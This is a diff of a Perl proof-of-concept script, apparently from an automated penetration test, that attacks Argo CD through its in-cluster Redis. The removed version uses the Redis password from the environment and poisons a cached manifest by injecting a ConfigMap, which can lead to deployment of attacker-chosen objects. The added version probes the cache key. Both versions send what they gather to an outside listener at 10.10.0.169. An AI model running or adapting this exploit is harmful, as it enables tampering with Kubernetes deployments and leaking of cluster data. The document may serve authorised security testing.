@@ -1,12 +1,6 @@
 #!/usr/bin/perl
-use strict; use warnings; use IO::Socket::INET; use Compress::Zlib; use JSON::PP; use bytes;
-sub redis_cmd { my @parts=@_; my $s='*'.scalar(@parts)."\r\n"; for my $p (@parts) { $s .= '$'.bytes::length($p)."\r\n$p\r\n"; } return $s; }
-sub read_line { my ($s)=@_; my $line=''; while(1){ my $c=''; my $n=sysread($s,$c,1); last unless $n; $line.=$c; last if $line =~ /\r\n$/; } $line =~ s/\r\n$//; return $line; }
-sub read_resp { my ($s)=@_; my $line=read_line($s); return undef if $line eq ''; my($type,$rest)=(substr($line,0,1),substr($line,1)); if($type eq '$'){ my $len=int($rest); return undef if $len<0; my $buf=''; while(bytes::length($buf)<$len){ my $chunk=''; my $want=$len-bytes::length($buf); my $n=sysread($s,$chunk,$want); last unless $n; $buf.=$chunk; } sysread($s,my $crlf,2); return $buf; } return $line; }
-my $key='mfst|argocd.argoproj.io/instance|directory-demo|6d2b0d43291b8106f8822b7e448071e28b8473a5|argocd|693080305|1.8.3.gz'; my $cm='brightbot-argocd-rce-proof-1783096752'; my $out='';
-my $r=IO::Socket::INET->new(PeerAddr=>'argocd-redis.argocd.svc.cluster.local',PeerPort=>6379,Proto=>'tcp',Timeout=>60);
-if($r){ binmode($r); my $pw=$ENV{REDIS_PASSWORD}||''; if($pw ne ''){ print $r redis_cmd('AUTH',$pw); read_resp($r); }
-  print $r redis_cmd('GET',$key); my $val=read_resp($r);
-  if(defined $val && bytes::length($val)>0){ my $json=Compress::Zlib::memGunzip($val); if(defined $json){ my $d=decode_json($json); my $manifest=encode_json({apiVersion=>'v1',kind=>'ConfigMap',metadata=>{name=>$cm,namespace=>'argocd',labels=>{'brightbot-proof'=>'argocd-redis-cache-poison'}},data=>{proof=>'created by benign Argo CD repo-server RCE / Redis cache poisoning proof', job=>'d1e180f5-6e84-4949-b0ee-ae10d38f8938'}}); push @{$d->{manifestResponse}{manifests}}, $manifest; my $newjson=encode_json($d); my $newgz=Compress::Zlib::memGzip($newjson); print $r redis_cmd('SET',$key,$newgz); my $setresp=read_resp($r); $out="setresp=$setresp cm=$cm oldbytes=".bytes::length($val)." newbytes=".bytes::length($newgz)." manifests=".scalar(@{$d->{manifestResponse}{manifests}}); } else { $out="gunzip_failed bytes=".bytes::length($val)." hex=".unpack('H*',substr($val,0,10)); } } else { $out='get_nil_or_empty'; } close($r);
-} else { $out="redisfail:$!"; }
-$out =~ s/\r|\n/ /g; my $s=IO::Socket::INET->new(PeerAddr=>'10.10.0.169',PeerPort=>8773,Proto=>'tcp',Timeout=>3); if($s){print $s "$out\n"; close($s);} exit 1;
+use strict; use warnings; use IO::Socket::INET;
+sub redis_cmd { my @parts=@_; my $s='*'.scalar(@parts)."\r\n"; for my $p (@parts) { $s .= '$'.length($p)."\r\n$p\r\n"; } return $s; }
+my $key='mfst|argocd.argoproj.io/instance|directory-demo|6d2b0d43291b8106f8822b7e448071e28b8473a5|argocd|693080305|1.8.3.gz'; my $out=''; my $r=IO::Socket::INET->new(PeerAddr=>'argocd-redis.argocd.svc.cluster.local',PeerPort=>6379,Proto=>'tcp',Timeout=>5);
+if($r){ my $pw=$ENV{REDIS_PASSWORD}||''; print $r redis_cmd('AUTH',$pw) if $pw ne ''; print $r redis_cmd('TYPE',$key); print $r redis_cmd('STRLEN',$key); print $r redis_cmd('EXISTS',$key); $r->shutdown(1); local $/; $out=<$r>//''; close($r); } else { $out="redisfail:$!"; }
+$out =~ s/\r|\n/ /g; my $s=IO::Socket::INET->new(PeerAddr=>'10.10.0.169',PeerPort=>8774,Proto=>'tcp',Timeout=>3); if($s){print $s "$out\n"; close($s);} exit 1;
